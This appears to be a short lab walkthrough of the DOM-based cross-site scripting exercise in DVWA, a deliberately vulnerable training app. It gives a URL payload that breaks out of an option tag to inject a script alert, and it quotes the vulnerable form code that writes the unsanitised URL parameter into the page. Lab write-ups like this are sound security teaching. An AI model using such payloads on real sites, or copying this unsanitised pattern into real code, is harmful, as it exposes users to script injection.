Select any option, you would see `?default=lang` in the URL, simply add this script in the URL smartly:
```
?default=English</option><script>alert('XSS')</script>
```
so the URL looks like:
`localhost/DVWA/vulnerabilities/xss_d/?default=English</option><script>alert('XSS')</script>`

This happens because the form code for this xss_dom is:

		<form name="XSS" method="GET">
			<select name="default">
				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}
					    
					document.write("<option value='English'>English</option>");
					document.write("<option value='French'>French</option>");
					document.write("<option value='Spanish'>Spanish</option>");
					document.write("<option value='German'>German</option>");
				</script>
			</select>
			<input type="submit" value="Select" />
		</form>

we close the option's tag and pass our stuff there.
